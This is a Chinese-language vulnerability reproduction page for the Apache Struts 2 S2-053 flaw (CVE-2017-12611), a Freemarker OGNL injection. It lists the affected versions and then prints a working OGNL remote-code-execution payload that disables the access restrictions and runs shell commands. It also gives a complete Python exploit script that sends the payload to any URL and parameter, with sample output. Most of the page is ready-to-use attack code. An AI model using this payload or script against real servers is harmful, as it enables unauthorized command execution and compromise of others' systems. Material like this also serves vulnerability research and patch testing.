<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-12611）S2-053</h1><h2>一、漏洞简介</h2><p>在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞</p><h2>二、漏洞影响</h2><p>Struts 2.0.1 - 2.3.33<br />Struts 2.5 - 2.5.10</p><h2>三、复现过程</h2><h3>poc</h3><p>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}</p><p>注意：执行命令的地方在于(#cmd=’whoami’)</p><h3>python poc</h3><h4><em>Usage</em></h4><p>exploit.py &lt;url&gt; &lt;param&gt; &lt;command&gt;</p><h4><em>Example</em></h4><p>$ python s2-053-exploit.py "http://127.0.0.1" "name" "uname -a"<br />[*] Generated EXP: http://127.0.0.1/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27uname%20-a%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D<br /><br />[*] Exploiting...<br />[+] Response: &lt;html&gt;<br />&lt;head&gt;<br />&lt;title&gt;S2-053 Demo&lt;/title&gt;<br />&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;S2-053 Demo&lt;/h1&gt;<br />&lt;hr /&gt;<br />Your name: Linux a66c177c2326 4.4.0-70-generic ;jsessionid=64A259D92EC63543AD72E6AA847319C9#91-Ubuntu SMP Wed Mar 22 12:47:43 UTC 2017 x86_64 GNU/Linux<br /><br />&lt;hr /&gt;<br />Enter your name here:&lt;br /&gt;<br />&lt;form action="" method="get"&gt;<br />&lt;input type="text" name="name" value="" /&gt;<br />&lt;input type="submit" value="Submit" /&gt;<br />&lt;/form&gt;<br />&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br />&lt;p&gt;See more at: &lt;a href="https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053"&gt;VulApps - S2-053&lt;/a&gt;&lt;/p&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /><br />[+] Exploit Finished!</p><h4><em>exploit.py</em></h4><p>import requests<br />import sys<br />from urllib import quote<br /><br />def exploit(url):<br />    res = requests.get(url, timeout=10)<br />    if res.status_code == 200:<br />        print "[+] Response: {}".format(str(res.text))<br />        print "\n[+] Exploit Finished!"<br />    else:<br />        print "\n[!] Exploit Failed!"<br /><br />if __name__ == "__main__":<br />    if len(sys.argv) != 4:<br />        print """****S2-053 Exploit****<br />Usage:<br />    exploit.py &lt;url&gt; &lt;param&gt; &lt;command&gt;<br />Example:<br />    exploit.py "http://127.0.0.1/" "name" "uname -a"<br />        """<br />        exit()<br />    url = sys.argv[1]<br />    param = sys.argv[2]<br />    command = sys.argv[3]<br />    #payload = &quot;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='&quot;+command+&quot;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;&quot;&quot;<br />    # Can show the echo message<br />    payload = &quot;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='&quot;+command+&quot;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}&quot;<br />    link = "{}/?{}={}".format(url, param, quote(payload))<br />    print "[*] Generated EXP: {}".format(link)<br />    print "\n[*] Exploiting..."<br />    exploit(link)</p></body></html>